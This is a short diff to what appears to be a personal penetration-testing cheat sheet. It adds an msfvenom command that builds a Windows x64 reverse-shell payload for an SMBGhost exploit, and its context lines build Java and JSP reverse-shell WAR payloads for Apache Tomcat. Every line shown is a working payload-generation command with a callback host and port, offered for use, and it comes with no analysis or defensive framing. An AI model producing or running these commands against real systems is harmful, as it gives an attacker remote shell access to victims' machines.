@@ -31,3 +31,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=443 -f asp -o ev
 # Apache Tomcat WAR Payload
 msfvenom -p  java/shell_reverse_tcp  LHOST=192.168.119.171 LPORT=443  -f war  -o sh.war
 msfvenom -p  java/jsp_shell_reverse_tcp  LHOST=10.11.0.99 LPORT=5566 -f raw  -o shell.war
+
+
+#Generate exploit.cpp Payload(smbgohst)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
